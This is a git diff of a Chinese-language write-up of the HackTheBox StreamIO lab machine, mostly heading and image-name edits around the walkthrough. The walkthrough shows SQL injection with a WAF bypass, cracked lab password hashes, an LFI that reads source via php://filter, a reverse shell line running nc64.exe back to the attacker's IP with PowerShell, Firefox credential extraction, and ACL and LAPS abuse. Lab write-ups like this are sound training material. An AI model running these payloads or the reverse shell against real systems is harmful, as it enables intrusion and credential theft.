@@ -5,9 +5,11 @@ pagination_next: null
 ---
 
 靶机为HTB的域渗透靶机StreamIO
-![](Pasted%20image%2020241218204233.png)
+![](Pasted_image_20241218204233.png)
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 ### 全端口扫描
 
 ~~~
@@ -155,8 +157,8 @@ Nmap done: 1 IP address (1 host up) scanned in 1090.12 seconds
 
 ~~~
 
-![](Pasted%20image%2020241218210603.png)
-# 修改hosts文件
+![](Pasted_image_20241218210603.png)
+### 配置 Hosts 文件
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
 └─$ sudo vim /etc/hosts                                                                                                              
@@ -174,7 +176,7 @@ ff02::2         ip6-allrouters
 ~~~
 
 
-# 子域名枚举
+### 子域名枚举
 
 仅有watch这个子域名
 
@@ -246,7 +248,7 @@ Found: xn--54qq0q0en86ikgxilmjza-biz.streamio.htb Status: 400 [Size: 334]
 Found: xn--qckr4fj9ii2a7e-jp.streamio.htb Status: 400 [Size: 334]
 ~~~
 
-# 139/445(SMB)
+### SMB 信息收集
 
 开了SMB服务，先用smbmap查看SMB的信息，发现无果
 
@@ -279,21 +281,21 @@ Password for [WORKGROUP\kali]:
 session setup failed: NT_STATUS_ACCESS_DENIED
 ~~~
 
-# 80(HTTP)
+### Web 80 信息收集
 http://streamio.htb看起来是IIS的默认页，http://watch.streamio.htb也是相同的默认页
 没什么其他的信息了，暂且搁置
 
-![](Pasted%20image%2020241218210704.png)
+![](Pasted_image_20241218210704.png)
 
-# 443(HTTPS)
+### Web 443 信息收集
 ### 访问https://streamio.htb
 是一个流媒体网站的介绍页
 
-![](Pasted%20image%2020241218214231.png)
+![](Pasted_image_20241218214231.png)
 
 对https://streamio.htb进行目录扫描
 
-![](Pasted%20image%2020241218214113.png)
+![](Pasted_image_20241218214113.png)
 ### feroxbuster
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
@@ -444,7 +446,7 @@ Finished
 发现about.php和login.php还有一个admin目录但是被forbidden了
 在about.php得到三个用户名
 
-![](Pasted%20image%2020241218215416.png)
+![](Pasted_image_20241218215416.png)
 
 做一个用户名的字典
 ~~~
@@ -459,29 +461,29 @@ admin
 
 有一个登录框，尝试了几组简单的弱口令和脏sql，都是失败
 
-![](Pasted%20image%2020241219134711.png)
+![](Pasted_image_20241219134711.png)
 
 发现有注册的入口，尝试注册
 
-![](Pasted%20image%2020241219134754.png)
+![](Pasted_image_20241219134754.png)
 
 注册一个账户lizi:123456
 
 再用新注册的账户尝试登录，还是失败
 
-![](Pasted%20image%2020241219141212.png)
+![](Pasted_image_20241219141212.png)
 
 
 
-### 访问watch.streamIO.htb
+### 访问 watch.streamIO.htb
 
 似乎提供了一个通过邮件地址进行视频网站订阅的服务
 
-![](Pasted%20image%2020241218210932.png)
+![](Pasted_image_20241218210932.png)
 
 有输入框可以输入邮件地址
 
-![](Pasted%20image%2020241218211051.png)
+![](Pasted_image_20241218211051.png)
 
 对他进行目录扫描
 
@@ -606,42 +608,46 @@ Finished
 
 发现存在search.php
 
-![](Pasted%20image%2020241219141739.png)
+![](Pasted_image_20241219141739.png)
+
+## 漏洞利用
+
+### SQL 注入获取用户凭据
 
 存在搜索框，尝试一些脏sql
 
 尝试' or 1=1 -- -被拦截，可能存在WAF
 
-![](Pasted%20image%2020241219141842.png)
+![](Pasted_image_20241219141842.png)
 
 测了几组数据，发现or应该是被过滤的
 
 使用payload  day' and 1=1 -- - 可以成功绕过
 
-![](Pasted%20image%2020241219142221.png)
+![](Pasted_image_20241219142221.png)
 
 在尝试lizi' union select 1,2,3,4,5,6; -- -出现回显结果
 
-![](Pasted%20image%2020241219143119.png)
+![](Pasted_image_20241219143119.png)
 
-![](Pasted%20image%2020241219143225.png)
+![](Pasted_image_20241219143225.png)
 
 查询所有数据库
 
-![](Pasted%20image%2020241219144024.png)
+![](Pasted_image_20241219144024.png)
 
 查询streamio数据库的所有表
 lizi' union select 1,name,3,4,5,6 from databases.sys.tables; -- -
 
-![](Pasted%20image%2020241219144234.png)
+![](Pasted_image_20241219144234.png)
 
 查询所有列
 lizi' UNION SELECT 1, name, 3, 4, 5, 6 FROM sys.columns WHERE object_id = OBJECT_ID('users'); -- -
-![](Pasted%20image%2020241219144913.png)
+![](Pasted_image_20241219144913.png)
 
 查询users表中的数据
 
-![](Pasted%20image%2020241219150834.png)
+![](Pasted_image_20241219150834.png)
 
 得到admin的密码哈希665a50ac9eaa781e4f7f04199db97a11，应该是md5，进行解密
 
@@ -663,13 +669,13 @@ Session completed.
 
 得到admin的密码，尝试登录，结果失败了
 
-![](Pasted%20image%2020241219151328.png)
+![](Pasted_image_20241219151328.png)
 
 再看一下其他人的用户名和密码，我们之前得到了网站开发员的名字Oliver，试一下他的密码
 
-![](Pasted%20image%2020241219151445.png)
+![](Pasted_image_20241219151445.png)
 
-![](Pasted%20image%2020241219151522.png)
+![](Pasted_image_20241219151522.png)
 
 或者干脆收集一下所有人的凭据
 
@@ -844,25 +850,27 @@ yoshihide :b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 
 ~~~
 
-![](Pasted%20image%2020241219152743.png)
+![](Pasted_image_20241219152743.png)
 
 构造两个字典
 
-![](Pasted%20image%2020241219153007.png)
+![](Pasted_image_20241219153007.png)
 
 利用bp进行登录
 最后通过yoshihide:66boysandgirls..成功登录但是没有交互的面板
 发现之前的admin目录可以访问
 
-![](Pasted%20image%2020241219155026.png)
+![](Pasted_image_20241219155026.png)
+
+### 代码审计与 LFI RCE
 
 对admin目录进行第二次扫描，发现了之前漏扫的master.php
 
-![](Pasted%20image%2020241219155449.png)
+![](Pasted_image_20241219155449.png)
 
 访问发现该文件只允许被包含
 
-![](Pasted%20image%2020241219155550.png)
+![](Pasted_image_20241219155550.png)
 
 
 url看起来似乎可以传参，对参数名进行fuzz，发现了一个感兴趣的debug
@@ -900,18 +908,18 @@ L
 
 对debug传参master.php试试，结果在没有管理员权限的情况下包含了master.php
 
-![](Pasted%20image%2020241219161153.png)
+![](Pasted_image_20241219161153.png)
 
 试一下包含其他文件https://streamio.htb/admin/?debug=c:\windows\win.ini
 失败
-![](Pasted%20image%2020241219161444.png)
+![](Pasted_image_20241219161444.png)
 
 尝试用php伪协议读取一下master.php的源码
 https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
 
 成功读取
 
-![](Pasted%20image%2020241219162255.png)
+![](Pasted_image_20241219162255.png)
 
 解密一下master.php的源码
 
@@ -1044,7 +1052,7 @@ echo(" ---- ERROR ---- ");
 
 在本体开启web服务，并准备一个nc64.exe
 
-![](Pasted%20image%2020241219163459.png)
+![](Pasted_image_20241219163459.png)
 
 准备一个恶意脚本
 
@@ -1057,16 +1065,20 @@ system("c:\\programdata\\nc64.exe 10.10.16.14 443 -e powershell.exe")
 
 建立监听
 
-![](Pasted%20image%2020241219164622.png)
+![](Pasted_image_20241219164622.png)
 
 用curl执行成功拿到初步shell
 
-![](Pasted%20image%2020241219170527.png)
+![](Pasted_image_20241219170527.png)
+
+## 权限提升
+
+### 数据库凭据获取与横向移动
 
 接下来要尝试横向移动
 
 查找一下数据库登陆凭据
-![](Pasted%20image%2020241219171043.png)
+![](Pasted_image_20241219171043.png)
 
 在login.php中找到db_user凭据
 
@@ -1082,7 +1094,7 @@ $connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB
 
 使用sqlcmd查看数据库备份文件中的表
 
-![](Pasted%20image%2020241219172240.png)
+![](Pasted_image_20241219172240.png)
 
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
@@ -1133,7 +1145,7 @@ Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 
 发现用户nikk37在dc上有家目录
 
-![](Pasted%20image%2020241219173152.png)
+![](Pasted_image_20241219173152.png)
 
 以nikk37的身份进行winrm登录
 
@@ -1154,7 +1166,7 @@ streamio\nikk37
 
 ~~~
 
-![](Pasted%20image%2020241219173436.png)
+![](Pasted_image_20241219173436.png)
 
 拿到userflag
 ~~~
@@ -1162,17 +1174,19 @@ streamio\nikk37
 86b773b4b4a5f776775127a637762135
 ~~~
 
+### Firefox 凭据窃取
+
 发现用户安装了firefox，可能存在凭证泄露问题
 
-![](Pasted%20image%2020241219174156.png)
+![](Pasted_image_20241219174156.png)
 
 下载key4.db和login.json
 
-![](Pasted%20image%2020241219175951.png)
+![](Pasted_image_20241219175951.png)
 
 使用firepwd进行破解
 
-![](Pasted%20image%2020241219181231.png)
+![](Pasted_image_20241219181231.png)
 
 得到几组凭据
 
@@ -1332,11 +1346,13 @@ INFO: Compressing output into 20241227062336_bloodhound.zip
 
 设置jdgodd为起点
 
-![](Pasted%20image%2020241227192705.png)
+![](Pasted_image_20241227192705.png)
+
+### BloodHound 分析与 ACL 提权
 
 分析路径，将jdgodd加入core stuff组从而提权
 
-![](Pasted%20image%2020241227193021.png)
+![](Pasted_image_20241227193021.png)
 
 将jdgodd加入到core staff组中
 
@@ -1376,6 +1392,8 @@ Global Group memberships     *Domain Users         *CORE STAFF
 The command completed successfully.
 
 ~~~
+
+### LAPS 凭据窃取
 
 读取laps得到密码
 
